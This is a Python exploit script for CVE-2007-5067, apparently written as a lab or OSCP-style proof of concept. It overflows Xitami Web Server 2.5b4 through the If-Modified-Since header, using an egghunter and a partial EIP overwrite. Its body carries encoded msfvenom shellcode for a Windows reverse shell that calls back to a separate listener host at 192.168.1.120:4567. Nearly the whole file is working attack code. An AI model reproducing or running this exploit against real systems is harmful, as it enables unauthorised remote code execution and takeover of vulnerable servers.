#!/usr/bin/python

# CVE: CVE-2007-5067 (https://www.cvedetails.com/cve/CVE-2007-5067/)
# Method: partial EIP override with egghunter
# Author: werebug (https://werebug.com)
# Tested on: Windows 7 Enterprise SP 1
# Software: Xitami Web Server 2.5b4

import requests

target = "http://192.168.1.126"

# EIP offset at 72
# Egghunter 32 bytes - Egg: 57657265 (Were)
payload = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x57\x65\x72\x65\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
payload += "A" * (72 - len(payload))
# 0x004c257b : "ret" | startnull,asciiprint,ascii {PAGE_READONLY} [xiwin32.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Xitami\xiwin32.exe)
payload += "\x7b\x25\x4c"

# Added a short jump ahead to our egghunter
headers = {
    'If-Modified-Since': "\xEB\x03d, " + payload
}
data = "WereWere"
data +=  "\x90" * 16
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.120 LPORT=4567 EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00"
data += "\xdb\xd8\xd9\x74\x24\xf4\x5a\xbe\x01\xb3\x73\x36\x2b"
data += "\xc9\xb1\x52\x83\xc2\x04\x31\x72\x13\x03\x73\xa0\x91"
data += "\xc3\x8f\x2e\xd7\x2c\x6f\xaf\xb8\xa5\x8a\x9e\xf8\xd2"
data += "\xdf\xb1\xc8\x91\x8d\x3d\xa2\xf4\x25\xb5\xc6\xd0\x4a"
data += "\x7e\x6c\x07\x65\x7f\xdd\x7b\xe4\x03\x1c\xa8\xc6\x3a"
data += "\xef\xbd\x07\x7a\x12\x4f\x55\xd3\x58\xe2\x49\x50\x14"
data += "\x3f\xe2\x2a\xb8\x47\x17\xfa\xbb\x66\x86\x70\xe2\xa8"
data += "\x29\x54\x9e\xe0\x31\xb9\x9b\xbb\xca\x09\x57\x3a\x1a"
data += "\x40\x98\x91\x63\x6c\x6b\xeb\xa4\x4b\x94\x9e\xdc\xaf"
data += "\x29\x99\x1b\xcd\xf5\x2c\xbf\x75\x7d\x96\x1b\x87\x52"
data += "\x41\xe8\x8b\x1f\x05\xb6\x8f\x9e\xca\xcd\xb4\x2b\xed"
data += "\x01\x3d\x6f\xca\x85\x65\x2b\x73\x9c\xc3\x9a\x8c\xfe"
data += "\xab\x43\x29\x75\x41\x97\x40\xd4\x0e\x54\x69\xe6\xce"
data += "\xf2\xfa\x95\xfc\x5d\x51\x31\x4d\x15\x7f\xc6\xb2\x0c"
data += "\xc7\x58\x4d\xaf\x38\x71\x8a\xfb\x68\xe9\x3b\x84\xe2"
data += "\xe9\xc4\x51\xa4\xb9\x6a\x0a\x05\x69\xcb\xfa\xed\x63"
data += "\xc4\x25\x0d\x8c\x0e\x4e\xa4\x77\xd9\xb1\x91\x76\x61"
data += "\x5a\xe0\x78\x80\x4d\x6d\x9e\xc8\x61\x38\x09\x65\x1b"
data += "\x61\xc1\x14\xe4\xbf\xac\x17\x6e\x4c\x51\xd9\x87\x39"
data += "\x41\x8e\x67\x74\x3b\x19\x77\xa2\x53\xc5\xea\x29\xa3"
data += "\x80\x16\xe6\xf4\xc5\xe9\xff\x90\xfb\x50\x56\x86\x01"
data += "\x04\x91\x02\xde\xf5\x1c\x8b\x93\x42\x3b\x9b\x6d\x4a"
data += "\x07\xcf\x21\x1d\xd1\xb9\x87\xf7\x93\x13\x5e\xab\x7d"
data += "\xf3\x27\x87\xbd\x85\x27\xc2\x4b\x69\x99\xbb\x0d\x96"
data += "\x16\x2c\x9a\xef\x4a\xcc\x65\x3a\xcf\xec\x87\xee\x3a"
data += "\x85\x11\x7b\x87\xc8\xa1\x56\xc4\xf4\x21\x52\xb5\x02"
data += "\x39\x17\xb0\x4f\xfd\xc4\xc8\xc0\x68\xea\x7f\xe0\xb8"

requests.get(target, headers=headers, data=data)
